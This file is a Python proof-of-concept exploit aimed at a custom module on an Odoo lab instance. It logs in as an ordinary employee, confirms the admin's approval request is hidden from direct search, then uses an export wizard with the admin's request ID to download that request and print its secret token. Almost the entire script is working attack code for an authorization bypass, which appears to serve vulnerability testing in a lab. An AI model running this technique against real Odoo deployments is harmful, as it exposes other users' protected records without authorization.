#!/usr/bin/env python3
import json
import os
import sys
import time
from pathlib import Path
from urllib.parse import urljoin

import requests


BASE_URL = os.environ.get("ODOO_URL", "http://127.0.0.1:8069")
DB_NAME = os.environ.get("ODOO_DB", "anypoc_odoo")
LOGIN = os.environ.get("ODOO_LOGIN", "employee@lab.local")
PASSWORD = os.environ.get("ODOO_PASSWORD", "employeepass")
TARGET_REQUEST_ID = int(os.environ.get("TARGET_REQUEST_ID", "1"))
OUTPUT_DIR = Path(os.environ["POC_OUT_DIR"])

ADMIN_NAME = "ANYPOC Admin Approval"
ADMIN_SECRET = "ANYPOC-APPROVAL-SECRET-9f4b3c"
EMPLOYEE_DECOY = "ANYPOC Employee Decoy"


def save_text(name: str, content: str) -> None:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    (OUTPUT_DIR / name).write_text(content, encoding="utf-8")


def save_json(name: str, payload) -> None:
    save_text(name, json.dumps(payload, indent=2, sort_keys=True))


def post_json(session: requests.Session, path: str, payload: dict, name: str) -> dict:
    url = urljoin(BASE_URL, path)
    response = session.post(url, json=payload, timeout=30)
    save_json(f"{name}_request.json", payload)
    save_text(f"{name}_response.json", response.text)
    save_text(
        f"{name}_meta.txt",
        f"POST {path}\nstatus={response.status_code}\ncontent-type={response.headers.get('Content-Type')}\n",
    )
    response.raise_for_status()
    data = response.json()
    if data.get("error"):
        raise RuntimeError(f"{name} returned RPC error: {json.dumps(data['error'], indent=2)}")
    return data["result"]


def call_kw(session: requests.Session, context: dict, model: str, method: str, args, kwargs=None) -> dict:
    if kwargs is None:
        kwargs = {}
    kwargs.setdefault("context", context)
    payload = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {
            "model": model,
            "method": method,
            "args": args,
            "kwargs": kwargs,
        },
    }
    return post_json(session, f"/web/dataset/call_kw/{model}/{method}", payload, f"{model}_{method}")


def normalize_create_result(result):
    if isinstance(result, list):
        if len(result) != 1:
            raise RuntimeError(f"unexpected create result: {result!r}")
        return result[0]
    return result


def wait_for_http(session: requests.Session) -> None:
    last_error = None
    for _ in range(30):
        try:
            response = session.get(urljoin(BASE_URL, "/web/login"), timeout=10)
            save_text("web_login_probe.txt", f"status={response.status_code}\n")
            if response.ok:
                return
        except Exception as exc:  # pragma: no cover - operational path
            last_error = exc
        time.sleep(1)
    raise RuntimeError(f"Odoo HTTP service did not become ready: {last_error}")


def main() -> int:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    session = requests.Session()
    wait_for_http(session)

    auth = post_json(
        session,
        "/web/session/authenticate",
        {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "db": DB_NAME,
                "login": LOGIN,
                "password": PASSWORD,
            },
        },
        "authenticate",
    )
    context = auth["user_context"]
    print(f"Authenticated as {auth['username']} (uid={auth['uid']}, name={auth['name']})")

    employee_rows = call_kw(
        session,
        context,
        "anypoc.approval.request",
        "search_read",
        [[["name", "=", EMPLOYEE_DECOY]]],
        {"fields": ["id", "name", "owner_id", "secret_token"]},
    )
    admin_rows = call_kw(
        session,
        context,
        "anypoc.approval.request",
        "search_read",
        [[["name", "=", ADMIN_NAME]]],
        {"fields": ["id", "name", "owner_id", "secret_token"]},
    )

    save_json("employee_visible.json", employee_rows)
    save_json("admin_visible.json", admin_rows)

    if not employee_rows:
        raise RuntimeError("employee baseline failed: decoy request is not visible")
    if admin_rows:
        raise RuntimeError(f"authorization baseline failed: admin request visible directly: {admin_rows!r}")

    print(
        "Baseline confirmed: employee can see their decoy request but direct search_read for the admin request returns 0 rows"
    )

    wizard_id = normalize_create_result(
        call_kw(
            session,
            context,
            "anypoc.approval.export.wizard",
            "create",
            [{"target_request_id": TARGET_REQUEST_ID}],
        )
    )
    print(f"Created export wizard id={wizard_id} targeting request id {TARGET_REQUEST_ID}")

    action = call_kw(
        session,
        context,
        "anypoc.approval.export.wizard",
        "action_generate_export",
        [[wizard_id]],
    )
    download_url = action["url"]
    save_json("action_generate_export_result.json", action)
    print(f"action_generate_export returned download URL: {download_url}")

    download_response = session.get(urljoin(BASE_URL, download_url), timeout=30)
    save_text(
        "download_meta.txt",
        f"GET {download_url}\nstatus={download_response.status_code}\ncontent-type={download_response.headers.get('Content-Type')}\n",
    )
    save_text("protected_export.json", download_response.text)
    download_response.raise_for_status()

    if ADMIN_SECRET not in download_response.text:
        raise RuntimeError("protected export did not contain the expected admin secret marker")

    export_data = json.loads(download_response.text)
    print(
        f"Exploit succeeded: request_name={export_data['request_name']!r}, owner_login={export_data['owner_login']!r}, secret_token={export_data['secret_token']!r}"
    )

    save_text(
        "SUMMARY.txt",
        "\n".join(
            [
                f"session_login={auth['username']}",
                f"session_uid={auth['uid']}",
                f"target_request_id={TARGET_REQUEST_ID}",
                f"wizard_id={wizard_id}",
                f"download_url={download_url}",
                f"request_name={export_data['request_name']}",
                f"owner_login={export_data['owner_login']}",
                f"secret_token={export_data['secret_token']}",
            ]
        )
        + "\n",
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
